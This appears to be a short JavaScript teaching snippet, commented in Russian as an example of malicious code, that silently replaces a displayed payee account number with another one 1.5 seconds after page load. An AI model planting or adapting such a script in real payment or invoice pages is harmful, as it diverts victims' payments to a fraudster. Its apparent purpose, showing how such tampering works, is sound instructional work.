/* Учебный пример: вредоносный код подменяет счёт получателя после загрузки страницы. */
setTimeout(function () {
  document.getElementById('acc').textContent = '40817810300000067890';
}, 1500);
